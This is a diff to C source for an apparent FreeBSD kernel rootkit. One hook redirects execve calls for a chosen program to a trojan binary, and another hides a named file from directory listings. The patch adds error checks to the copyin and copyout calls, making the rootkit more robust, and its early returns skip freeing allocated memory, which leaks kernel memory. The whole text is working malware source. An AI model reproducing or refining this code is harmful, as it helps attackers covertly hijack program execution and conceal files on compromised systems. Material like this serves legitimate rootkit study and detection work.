@@ -122,6 +122,7 @@ execve_hook(struct thread *td, void *syscall_args)
         struct vmspace *vm;
         vm_offset_t base, addr;
         char t_fname[] = TROJAN;
+	int error;
 
         /* Redirect this process? */
         if (strcmp(uap->fname, ORIGINAL) == 0) {
@@ -148,14 +149,18 @@ execve_hook(struct thread *td, void *syscall_args)
                  * in user space, you'll have to place any new "arrays" that
                  * this structure points to in user space as well.
                  */
-                copyout(&t_fname, (char *)addr, strlen(t_fname));
+                error = copyout(&t_fname, (char *)addr, strlen(t_fname));
+		if (error)
+			return(error);
                 kernel_ea.fname = (char *)addr;
                 kernel_ea.argv = uap->argv;
                 kernel_ea.envv = uap->envv;
 
                 /* Copy out the TROJAN execve_args structure. */
                 user_ea = (struct execve_args *)addr + sizeof(t_fname);
-                copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
+                error = copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
+		if (error)
+			return(error);
 
                 /* Execute TROJAN. */
                 return(sys_execve(curthread, user_ea));
@@ -181,6 +186,7 @@ getdirentries_hook(struct thread *td, void *syscall_args)
 
         struct dirent *dp, *current;
         unsigned int size, count;
+	int error;
 
         /*
          * Store the directory entries found in fd in buf, and record the
@@ -192,7 +198,9 @@ getdirentries_hook(struct thread *td, void *syscall_args)
         /* Does fd actually contain any directory entries? */
         if (size > 0) {
 		dp = (struct dirent *) malloc(size, M_TEMP, M_NOWAIT);
-                copyin(uap->buf, dp, size);
+                error = copyin(uap->buf, dp, size);
+		if (error)
+			return(error);
 
                 current = dp;
                 count = size;
@@ -237,7 +245,9 @@ getdirentries_hook(struct thread *td, void *syscall_args)
                  * hide it. If T_NAME wasn't found...don't worry 'bout it.
                  */
                 td->td_retval[0] = size;
-                copyout(dp, uap->buf, size);
+                error = copyout(dp, uap->buf, size);
+		if (error)
+			return(error);
 
                 free(dp, M_TEMP);
         }
